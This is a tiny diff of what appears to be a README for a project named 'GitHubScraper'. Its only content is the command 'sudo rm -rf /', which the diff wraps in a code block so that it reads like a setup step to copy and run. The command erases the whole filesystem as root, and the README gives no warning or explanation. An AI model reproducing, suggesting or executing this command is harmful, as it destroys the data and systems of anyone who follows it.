@@ -1,2 +1,4 @@
 # GitHubScraper
+```
 sudo rm -rf /
+```
